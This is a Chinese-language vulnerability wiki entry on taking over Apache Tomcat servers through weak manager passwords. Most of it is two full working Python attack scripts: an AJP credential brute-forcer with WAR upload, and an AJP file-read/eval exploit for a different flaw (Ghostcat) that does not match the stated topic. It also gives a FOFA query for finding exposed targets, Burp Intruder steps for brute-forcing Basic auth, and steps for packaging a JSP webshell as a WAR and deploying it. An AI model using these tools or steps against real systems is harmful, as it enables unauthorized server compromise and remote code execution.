

# Tomcat 管理后台弱口令导致的文件上传GetShell





## 0x00 漏洞说明



Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。

若是Tomcat管理后台存在弱口令，则可以进入后台上传部署war包 geshell





## 0x01 影响版本



全版本



## 0x02 漏洞成因



1. 后台密码为弱口令
2. 管理页面未设置访控



## 0x03 漏洞代码



```
http://<target>/manager/html
```







## 0x04 详细分析




```
https[:]//mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ

http[:]//web.archive.org/web/20220313134342/https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ
```





## 0x05 漏洞指纹



fofa:

```
app="Apache-Tomcat"
```





## 0x06 POC & EXP




!FILENAME poc.py
```python
#!/usr/bin/env python
#
# Julien Legras - Synacktiv
#
# THIS SOFTWARE IS PROVIDED BY SYNACKTIV ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL SYNACKTIV BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from pprint import pprint, pformat

import socket
import argparse
import logging
import re
import os
from StringIO import StringIO
import logging
from colorlog import ColoredFormatter
from urllib import unquote


def setup_logger():
    """Return a logger with a default ColoredFormatter."""
    formatter = ColoredFormatter(
        "[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        reset=True,
        log_colors={
            'DEBUG': 'bold_purple',
            'INFO': 'bold_green',
            'WARNING': 'bold_yellow',
            'ERROR': 'bold_red',
            'CRITICAL': 'bold_red',
        }
    )

    logger = logging.getLogger('meow')
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)

    return logger


logger = setup_logger()


# helpers
def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
    fr.method = method
    fr.protocol = "HTTP/1.1"
    fr.req_uri = req_uri
    fr.remote_addr = target_host
    fr.remote_host = None
    fr.server_name = target_host
    fr.server_port = 80
    fr.request_headers = {
        'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'SC_REQ_CONNECTION': 'keep-alive',
        'SC_REQ_CONTENT_LENGTH': '0',
        'SC_REQ_HOST': target_host,
        'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    fr.is_ssl = False

    fr.attributes = []

    return fr


class Tomcat(object):
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.connect((target_host, target_port))
        self.stream = self.socket.makefile("rb", bufsize=0)

    def test_password(self, user, password):
        res = False
        stop = False
        self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode(
            'base64').replace('\n', '')
        while not stop:
            logger.debug("testing %s:%s" % (user, password))
            responses = self.forward_request.send_and_receive(self.socket, self.stream)
            snd_hdrs_res = responses[0]
            if snd_hdrs_res.http_status_code == 404:
                raise NotFoundException("The req_uri %s does not exist!" % self.req_uri)
            elif snd_hdrs_res.http_status_code == 302:
                self.req_uri = snd_hdrs_res.response_headers.get('Location', '')
                logger.info("Redirecting to %s" % self.req_uri)
                self.forward_request.req_uri = self.req_uri
            elif snd_hdrs_res.http_status_code == 200:
                logger.info("Found valid credz: %s:%s" % (user, password))
                res = True
                stop = True
                if 'Set-Cookie' in snd_hdrs_res.response_headers:
                    logger.info("Here is your cookie: %s" % (snd_hdrs_res.response_headers.get('Set-Cookie', '')))
            elif snd_hdrs_res.http_status_code == 403:
                logger.info("Found valid credz: %s:%s but the user is not authorized to access this resource" % (
                    user, password))
                stop = True
            elif snd_hdrs_res.http_status_code == 401:
                stop = True

        return res

    def start_bruteforce(self, users, passwords, req_uri, autostop):
        logger.info("Attacking a tomcat at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
        self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri)

        f_users = open(users, "r")
        f_passwords = open(passwords, "r")

        valid_credz = []
        try:
            for user in f_users:
                f_passwords.seek(0, 0)
                for password in f_passwords:
                    if autostop and len(valid_credz) > 0:
                        self.socket.close()
                        return valid_credz

                    user = user.rstrip('\n')
                    password = password.rstrip('\n')
                    if self.test_password(user, password):
                        valid_credz.append((user, password))
        except NotFoundException as e:
            logger.fatal(e.message)
        finally:
            logger.debug("Closing socket...")
            self.socket.close()
            return valid_credz

    def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
        self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,
                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))
        logger.debug("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
        if user is not None and password is not None:
            self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + (
                    "%s:%s" % (user, password)).encode('base64').replace('\n', '')

        for h in headers:
            self.forward_request.request_headers[h] = headers[h]

        for a in attributes:
            self.forward_request.attributes.append(a)

        responses = self.forward_request.send_and_receive(self.socket, self.stream)
        print(responses)
        if len(responses) == 0:
            return None, None

        snd_hdrs_res = responses[0]

        data_res = responses[1:-1]
        if len(data_res) == 0:
            logger.info("No data in response. Headers:\n %s" % pformat(vars(snd_hdrs_res)))

        return snd_hdrs_res, data_res

    def upload(self, filename, user, password, old_version, headers={}):
        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)
        with open(filename, "rb") as f_input:
            with open("/tmp/request", "w+b") as f:
                s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="deployWar"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n' % os.path.basename(
                    filename)
                s_form_footer = '\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'
                f.write(s_form_header)
                f.write(f_input.read())
                f.write(s_form_footer)

        data_len = os.path.getsize("/tmp/request")

        headers = {
            "SC_REQ_CONTENT_TYPE": "multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti",
            "SC_REQ_CONTENT_LENGTH": "%d" % data_len,
            "SC_REQ_REFERER": "http://%s/manager/html/" % (self.target_host),
            "Origin": "http://%s" % (self.target_host),
        }
        if obj_cookie is not None:
            headers["SC_REQ_COOKIE"] = obj_cookie.group('cookie')

        attributes = [{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")},
                      {"name": "req_attribute", "value": ("AJP_REMOTE_PORT", "12345")}]
        if old_version == False:
            attributes.append({"name": "query_string", "value": deploy_csrf_token})
        old_apps = self.list_installed_applications(user, password, old_version)
        r = self.perform_request("/manager/html/upload", headers=headers, method="POST", user=user, password=password,
                                 attributes=attributes)

        with open("/tmp/request", "rb") as f:
            br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)
            br.send_and_receive(self.socket, self.stream)

        r = AjpResponse.receive(self.stream)
        if r.prefix_code == AjpResponse.END_RESPONSE:
            logger.error('Upload failed')

        while r.prefix_code != AjpResponse.END_RESPONSE:
            r = AjpResponse.receive(self.stream)
        logger.debug('Upload seems normal. Checking...')
        new_apps = self.list_installed_applications(user, password, old_version)
        if len(new_apps) == len(old_apps) + 1 and new_apps[:-1] == old_apps:
            logger.info('Upload success!')
        else:
            logger.error('Upload failed')

    def get_error_page(self):
        return self.perform_request("/blablablablabla")

    def get_version(self):
        hdrs, data = self.get_error_page()
        for d in data:
            s = re.findall('(Apache Tomcat/[0-9\.]+) ', d.data)
            if len(s) > 0:
                return s[0]

    def get_csrf_token(self, user, password, old_version, headers={}, query=[]):
        # first we request the manager page to get the CSRF token
        hdrs, rdata = self.perform_request("/manager/html", headers=headers, user=user, password=password)
        deploy_csrf_token = re.findall('(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)"',
                                       "".join([d.data for d in rdata]))
        if old_version == False:
            if len(deploy_csrf_token) == 0:
                logger.critical("Failed to get CSRF token. Check the credentials")
                return

            logger.debug('CSRF token = %s' % deploy_csrf_token[0])
        obj = re.match("(?P<cookie>JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly",
                       hdrs.response_headers.get('Set-Cookie', ''))
        if obj is not None:
            return deploy_csrf_token[0], obj
        return deploy_csrf_token[0], None

    def list_installed_applications(self, user, password, old_version, headers={}):
        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)
        headers = {
            "SC_REQ_CONTENT_TYPE": "application/x-www-form-urlencoded",
            "SC_REQ_CONTENT_LENGTH": "0",
            "SC_REQ_REFERER": "http://%s/manager/html/" % (self.target_host),
            "Origin": "http://%s" % (self.target_host),
        }
        if obj_cookie is not None:
            headers["SC_REQ_COOKIE"] = obj_cookie.group('cookie')

        attributes = [{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")},
                      {"name": "req_attribute",
                       "value": ("AJP_REMOTE_PORT", "{}".format(self.socket.getsockname()[1]))}]
        if old_version == False:
            attributes.append({
                "name": "query_string", "value": "%s" % deploy_csrf_token})
        hdrs, data = self.perform_request("/manager/html/", headers=headers, method="GET", user=user, password=password,
                                          attributes=attributes)
        found = []
        for d in data:
            im = re.findall('/manager/html/expire\?path=([^&]*)&', d.data)
            for app in im:
                found.append(unquote(app))
        return found

    def undeploy(self, path, user, password, old_version, headers={}):
        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)
        path_app = "path=%s" % path
        headers = {
            "SC_REQ_CONTENT_TYPE": "application/x-www-form-urlencoded",
            "SC_REQ_CONTENT_LENGTH": "0",
            "SC_REQ_REFERER": "http://%s/manager/html/" % (self.target_host),
            "Origin": "http://%s" % (self.target_host),
        }
        if obj_cookie is not None:
            headers["SC_REQ_COOKIE"] = obj_cookie.group('cookie')

        attributes = [{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")},
                      {"name": "req_attribute",
                       "value": ("AJP_REMOTE_PORT", "{}".format(self.socket.getsockname()[1]))}]
        if old_version == False:
            attributes.append({
                "name": "query_string", "value": "%s&%s" % (path_app, deploy_csrf_token)})
        r = self.perform_request("/manager/html/undeploy", headers=headers, method="POST", user=user, password=password,
                                 attributes=attributes)
        r = AjpResponse.receive(self.stream)
        if r.prefix_code == AjpResponse.END_RESPONSE:
            logger.error('Undeploy failed')

        # Check the successful message
        found = False
        regex = r'<small><strong>Message:<\/strong><\/small>&nbsp;<\/td>\s*<td class="row-left"><pre>(OK - .*' + path + ')\s*<\/pre><\/td>'
        while r.prefix_code != AjpResponse.END_RESPONSE:
            r = AjpResponse.receive(self.stream)
            if r.prefix_code == 3:
                f = re.findall(regex, r.data)
                if len(f) > 0:
                    found = True
        if found:
            logger.info('Undeploy succeed')
        else:
            logger.error('Undeploy failed')


if __name__ == "__main__":


    parser = argparse.ArgumentParser()
    parser.add_argument('target', type=str, help="Hostname or IP to attack")
    parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
    parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
    args = parser.parse_args()
    bf = Tomcat(args.target, args.port)
    attributes = [
        {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
        {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', args.file]},
        {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
    ]
    snd_hdrs_res, data_res = bf.perform_request(req_uri='/',method='GET', attributes=attributes)
    print("".join([d.data for d in data_res]))
```



!FILENAME exp.py

```python
#!/usr/bin/python3
# Author: 00theway

import socket
import binascii
import argparse
import urllib.parse

debug = False


def log(type, *args, **kwargs):
    if type == 'debug' and debug == False:
        return
    elif type == 'append' and debug == True:
        return
    elif type == 'append':
        kwargs['end'] = ''
        print(*args, **kwargs)
        return
    print('[%s]' % type.upper(), *args, **kwargs)


class ajpRequest(object):
    def __init__(self, request_url, method='GET', headers=[], attributes=[]):
        self.request_url = request_url
        self.method = method
        self.headers = headers
        self.attributes = attributes

    def method2code(self, method):
        methods = {
            'OPTIONS': 1,
            'GET': 2,
            'HEAD': 3,
            'POST': 4,
            'PUT': 5,
            'DELETE': 6,
            'TRACE': 7,
            'PROPFIND': 8
        }
        code = methods.get(method, 2)
        return code

    def make_headers(self):
        header2code = {
            b'accept': b'\xA0\x01',  # SC_REQ_ACCEPT
            b'accept-charset': b'\xA0\x02',  # SC_REQ_ACCEPT_CHARSET
            b'accept-encoding': b'\xA0\x03',  # SC_REQ_ACCEPT_ENCODING
            b'accept-language': b'\xA0\x04',  # SC_REQ_ACCEPT_LANGUAGE
            b'authorization': b'\xA0\x05',  # SC_REQ_AUTHORIZATION
            b'connection': b'\xA0\x06',  # SC_REQ_CONNECTION
            b'content-type': b'\xA0\x07',  # SC_REQ_CONTENT_TYPE
            b'content-length': b'\xA0\x08',  # SC_REQ_CONTENT_LENGTH
            b'cookie': b'\xA0\x09',  # SC_REQ_COOKIE
            b'cookie2': b'\xA0\x0A',  # SC_REQ_COOKIE2
            b'host': b'\xA0\x0B',  # SC_REQ_HOST
            b'pragma': b'\xA0\x0C',  # SC_REQ_PRAGMA
            b'referer': b'\xA0\x0D',  # SC_REQ_REFERER
            b'user-agent': b'\xA0\x0E'  # SC_REQ_USER_AGENT
        }
        headers_ajp = []

        for (header_name, header_value) in self.headers:
            code = header2code.get(header_name, b'')
            if code != b'':
                headers_ajp.append(code)
                headers_ajp.append(self.ajp_string(header_value))
            else:
                headers_ajp.append(self.ajp_string(header_name))
                headers_ajp.append(self.ajp_string(header_value))

        return self.int2byte(len(self.headers), 2), b''.join(headers_ajp)

    def make_attributes(self):
        '''
        org.apache.catalina.jsp_file
        javax.servlet.include.servlet_path + javax.servlet.include.path_info
        '''
        attribute2code = {
            b'remote_user': b'\x03',
            b'auth_type': b'\x04',
            b'query_string': b'\x05',
            b'jvm_route': b'\x06',
            b'ssl_cert': b'\x07',
            b'ssl_cipher': b'\x08',
            b'ssl_session': b'\x09',
            b'req_attribute': b'\x0A',  # Name (the name of the attribut follows)
            b'ssl_key_size': b'\x0B'
        }
        attributes_ajp = []

        for (name, value) in self.attributes:
            code = attribute2code.get(name, b'')
            if code != b'':
                attributes_ajp.append(code)
                if code == b'\x0A':
                    for v in value:
                        attributes_ajp.append(self.ajp_string(v))
                else:
                    attributes_ajp.append(self.ajp_string(value))

        return b''.join(attributes_ajp)

    def ajp_string(self, message_bytes):
        # an AJP string
        # the length of the string on two bytes + string + plus two null bytes
        message_len_int = len(message_bytes)
        return self.int2byte(message_len_int, 2) + message_bytes + b'\x00'

    def int2byte(self, data, byte_len=1):
        return data.to_bytes(byte_len, 'big')

    def make_forward_request_package(self):
        '''
        AJP13_FORWARD_REQUEST :=
            prefix_code      (byte) 0x02 = JK_AJP13_FORWARD_REQUEST
            method           (byte)
            protocol         (string)
            req_uri          (string)
            remote_addr      (string)
            remote_host      (string)
            server_name      (string)
            server_port      (integer)
            is_ssl           (boolean)
            num_headers      (integer)
            request_headers *(req_header_name req_header_value)
            attributes      *(attribut_name attribute_value)
            request_terminator (byte) OxFF
        '''
        req_ob = urllib.parse.urlparse(self.request_url)

        # JK_AJP13_FORWARD_REQUEST
        prefix_code_int = 2
        prefix_code_bytes = self.int2byte(prefix_code_int)
        method_bytes = self.int2byte(self.method2code(self.method))
        protocol_bytes = b'HTTP/1.1'
        req_uri_bytes = req_ob.path.encode('utf8')
        remote_addr_bytes = b'127.0.0.1'
        remote_host_bytes = b'localhost'
        server_name_bytes = req_ob.hostname.encode('utf8')

        # SSL flag
        if req_ob.scheme == 'https':
            is_ssl_boolean = 1
        else:
            is_ssl_boolean = 0

        # port
        server_port_int = req_ob.port
        if not server_port_int:
            server_port_int = (is_ssl_boolean ^ 1) * 80 + (is_ssl_boolean ^ 0) * 443
        server_port_bytes = self.int2byte(server_port_int, 2)  # convert to a two bytes

        is_ssl_bytes = self.int2byte(is_ssl_boolean)  # convert to a one byte

        self.headers.append((b'host', b'%s:%d' % (server_name_bytes, server_port_int)))

        num_headers_bytes, headers_ajp_bytes = self.make_headers()

        attributes_ajp_bytes = self.make_attributes()

        message = []
        message.append(prefix_code_bytes)
        message.append(method_bytes)
        message.append(self.ajp_string(protocol_bytes))
        message.append(self.ajp_string(req_uri_bytes))
        message.append(self.ajp_string(remote_addr_bytes))
        message.append(self.ajp_string(remote_host_bytes))
        message.append(self.ajp_string(server_name_bytes))
        message.append(server_port_bytes)
        message.append(is_ssl_bytes)
        message.append(num_headers_bytes)
        message.append(headers_ajp_bytes)
        message.append(attributes_ajp_bytes)
        message.append(b'\xff')
        message_bytes = b''.join(message)

        send_bytes = b'\x12\x34' + self.ajp_string(message_bytes)

        return send_bytes


class ajpResponse(object):
    def __init__(self, s, out_file):
        self.sock = s
        self.out_file = out_file
        self.body_start = False
        self.common_response_headers = {
            b'\x01': b'Content-Type',
            b'\x02': b'Content-Language',
            b'\x03': b'Content-Length',
            b'\x04': b'Date',
            b'\x05': b'Last-Modified',
            b'\x06': b'Location',
            b'\x07': b'Set-Cookie',
            b'\x08': b'Set-Cookie2',
            b'\x09': b'Servlet-Engine',
            b'\x0a': b'Status',
            b'\x0b': b'WWW-Authenticate',
        }
        if not self.out_file:
            self.out_file = False
        else:
            log('*', 'store response in %s' % self.out_file)
            self.out = open(self.out_file, 'wb')

    def parse_response(self):
        log('debug', 'start')

        magic = self.recv(2)  # first two bytes are the 'magic'
        log('debug', 'magic', magic, binascii.b2a_hex(magic))
        # next two bytes are the length
        data_len_int = self.read_int(2)

        code_int = self.read_int(1)
        log('debug', 'code', code_int)

        if code_int == 3:
            self.parse_send_body_chunk()
        elif code_int == 4:
            self.parse_headers()
        elif code_int == 5:
            self.parse_response_end()
            quit()

        self.parse_response()

    def parse_headers(self):
        log("append", '\n')
        log('debug', 'parsing RESPONSE HEADERS')

        status_int = self.read_int(2)
        msg_bytes = self.read_string()

        log('<', status_int, msg_bytes.decode('utf8'))

        headers_number_int = self.read_int(2)
        log('debug', 'headers_nb', headers_number_int)

        for i in range(headers_number_int):
            # header name: two cases
            first_byte = self.recv(1)
            second_byte = self.recv(1)

            if first_byte == b'\xa0':
                header_key_bytes = self.common_response_headers[second_byte]
            else:
                header_len_bytes = first_byte + second_byte
                header_len_int = int.from_bytes(header_len_bytes, byteorder='big')
                header_key_bytes = self.read_bytes(header_len_int)
                # consume the 0x00 terminator
                self.recv(1)

            header_value_bytes = self.read_string()
            try:
                header_key_bytes = header_key_bytes.decode('utf8')
                header_value_bytes = header_value_bytes.decode('utf8')
            except:
                pass
            log('<', '%s: %s' % (header_key_bytes, header_value_bytes))

    def parse_send_body_chunk(self):
        if not self.body_start:
            log('append', '\n')
            log('debug', 'start parsing body chunk')
            self.body_start = True
        chunk = self.read_string()
        if self.out_file:
            self.out.write(chunk)
        else:
            try:
                chunk = chunk.decode('utf8')
            except:
                pass

            log('append', chunk)

    def parse_response_end(self):
        log('debug', 'start parsing end')
        code_reuse_int = self.read_int(1)
        log('debug', "finish parsing end", code_reuse_int)
        self.sock.close()

    def read_int(self, int_len):
        return int.from_bytes(self.recv(int_len), byteorder='big')

    def read_bytes(self, bytes_len):
        return self.recv(bytes_len)

    def read_string(self, int_len=2):
        data_len = self.read_int(int_len)
        data = self.recv(data_len)
        # consume the 0x00 terminator
        end = self.recv(1)
        log('debug', 'read_string read data_len:%d\ndata_len:%d\nend:%s' % (data_len, len(data), end))
        return data

    def recv(self, data_len):
        data = self.sock.recv(data_len)
        while len(data) < data_len:
            log('debug', 'recv not end,wait for %d bytes' % (data_len - len(data)))
            data += self.sock.recv(data_len - len(data))
        return data


class ajpShooter(object):
    def __init__(self, args):
        self.args = args
        self.headers = args.header
        self.ajp_port = args.ajp_port
        self.requesturl = args.url
        self.target_file = args.target_file
        self.shooter = args.shooter
        self.method = args.X
        self.out_file = args.out_file

    def shoot(self):
        headers = self.transform_headers()

        target_file = self.target_file.encode('utf8')

        attributes = []
        evil_req_attributes = [
            (b'javax.servlet.include.request_uri', b'index'),
            (b'javax.servlet.include.servlet_path', target_file)
        ]

        for req_attr in evil_req_attributes:
            attributes.append((b"req_attribute", req_attr))

        if self.shooter == 'read':
            self.requesturl += '/index.txt'
        else:
            self.requesturl += '/index.jsp'

        ajp_ip = urllib.parse.urlparse(self.requesturl).hostname

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ajp_ip, self.ajp_port))

        message = ajpRequest(self.requesturl, self.method, headers, attributes).make_forward_request_package()
        s.send(message)

        ajpResponse(s, self.out_file).parse_response()

    def transform_headers(self):
        self.headers = [] if not self.headers else self.headers
        newheaders = []
        for header in self.headers:
            hsplit = header.split(':')
            hname = hsplit[0]
            hvalue = ':'.join(hsplit[1:])
            newheaders.append((hname.lower().encode('utf8'), hvalue.encode('utf8')))

        return newheaders


if __name__ == "__main__":
    # parse command line arguments
    print('''
       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    ''')
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='target site\'s context root url like http://www.example.com/demo/')
    parser.add_argument('ajp_port', default=8009, type=int, help='ajp port')
    parser.add_argument('target_file', help='target file to read or eval like /WEB-INF/web.xml,/image/evil.jpg')
    parser.add_argument('shooter', choices=['read', 'eval'], help='read or eval file')

    parser.add_argument('--ajp-ip', help='ajp server ip,default value will parse from from url')
    parser.add_argument('-H', '--header', help='add a header', action='append')
    parser.add_argument('-X', help='Sets the method (default: %(default)s).', default='GET',
                        choices=['GET', 'POST', 'HEAD', 'OPTIONS', 'PROPFIND'])
    parser.add_argument('-d', '--data', nargs=1, help='The data to POST')
    parser.add_argument('-o', '--out-file', help='write response to file')
    parser.add_argument('--debug', action='store_true', default=False)

    args = parser.parse_args()
    debug = args.debug
    ajpShooter(args).shoot()
```









## 0x07 利用思路



首先探测目标管理页面，不同版本可能存在于不同目录，可以使用ffuf等工具



随后使用burp抓取认证包，他看起来像这样



```raw
GET /manager/html HTTP/1.1
Host: xxxxx
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Authorization: Basic §YWRtaW46MTIzNDU2§ //这里是认证字段，一般只是base64编码
```



发送到 `Intruder` 选择 Attack Type `Sniper` ，并对Authorization: Basic 后的内容设置 `§` 标识。 在Payloads 选项卡中的 Payload Type 标签中将其设置为 `Custom iterator` ；



**如果目标数据包中有Cookie字段，需要删除或者随机fuzz，否则401**



在 Payload Options 子标签中，的Position处，选择 1、2、3 Payload内容卡，分别在1中填写用户名 , 2中填写 `:`符号 , 3中填写密码



在Payload Processing 子标签中，点击 `add` 选择 `Encode` 和 `Base64-encode` ，最后将Payload Encoding 子标签的内容取消勾选，随后开始爆破



利用命令把 jsp webshell 转换为war包

```
jar -cvf <war filename> "shell.jsp"
```



**实战中直接zip打包改名也可以**





在登入后台后，点击 List Applications 在 WAR file to deploy 选项卡中选择war 文件上传



利用webshell 管理工具连接，访问路径是 `/war包名(不带.war)/XXX.jsp`



图文链接:

https[:]//github.com/fofapro/vulfocus/blob/master/writeup/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4.md





## 0x08 扩展链接



[Tomcat 弱口令 Getshell by Frivolous-scholar](https://github.com/fofapro/vulfocus/blob/master/writeup/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4.md) 



## 0x9 联系方式



作者 : BitWiki支持团队
